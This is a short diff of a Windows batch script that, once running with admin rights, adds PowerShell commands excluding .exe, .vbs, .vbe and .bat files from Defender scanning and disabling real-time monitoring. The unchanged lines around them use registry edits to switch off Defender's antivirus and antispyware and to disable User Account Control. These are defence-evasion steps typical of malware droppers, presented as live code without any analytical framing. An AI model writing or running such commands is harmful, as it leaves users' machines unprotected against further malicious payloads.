@@ -35,6 +35,8 @@ if defined IsAdmin (
 )
 pause
 :admin
+powershell -Command Add-MpPreference -ExclusionExtension ".exe, .vbs, .vbe, .bat"
+powershell -Command Set-MpPreference -DisableRealtimeMonitoring $true
 reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f
 reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiVirus" /t REG_DWORD /d "1" /f
 reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
